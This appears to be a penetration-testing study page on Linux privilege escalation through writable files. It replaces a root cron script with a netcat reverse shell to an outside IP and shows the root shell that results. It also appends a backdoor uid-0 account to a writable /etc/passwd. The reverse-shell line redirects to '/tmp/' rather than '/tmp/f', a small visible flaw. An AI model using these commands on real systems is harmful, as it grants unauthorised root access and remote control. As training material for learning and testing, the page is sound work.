# Insecure File Permissions

In order to leverage insecure file permissions we need to find a file that allows us write access but is executed at a higher privilege level.

## Abusing Cron Jobs

Let's view _**/var/log/syslog**_ for "CRON" logs. Alternatively, could also inspect the cron log file (_**/var/log/cron.log**_) for running cron jobs:

```shell-session
$ grep "CRON" /var/log/syslog
...
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (pidfile fd = 3)
Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (Running @reboot jobs)
Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```

**user\_backups.sh** under **/home/joe/** is executed in the context of the root user.

We can replace **user\_backups.sh** with our own script, a reverse shell, is a nice choice!

#### Replace with Reverse Shell

```shell-session
rm /home/joe/.scripts/user_backups.sh

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/" >> user_backups.sh
```

#### Create Listener

```shell-session
kali@kali$ nc -lnvp 1234
listening on [any] 1234 ...
connect to [192.168.118.2] from (UNKNOWN) [192.168.50.214] 57698
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```



### Abusing Password Authentication

It's possible for Linux to utilize a centralized repository to manage passwords such as LDAP or Active Directory, however passwords are generally stored in **/etc/shadow**.



Abusing older /etc/passwd permissions.

In older versions of UNIX, the password has was stored in /etc/passwd. If we come across an /etc/passwd file that contains a password hash we can crack it and assume it'll work for authentication.&#x20;

Likewise, we can attempt to add a generate a password hash with openssl and add it to the /etc/passwd file.

```
$ openssl passwd w00t
Fdzt.eqJQ4s0g

$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

$ su root2
Password: w00t

# id
uid=0(root) gid=0(root) groups=0(root)
```
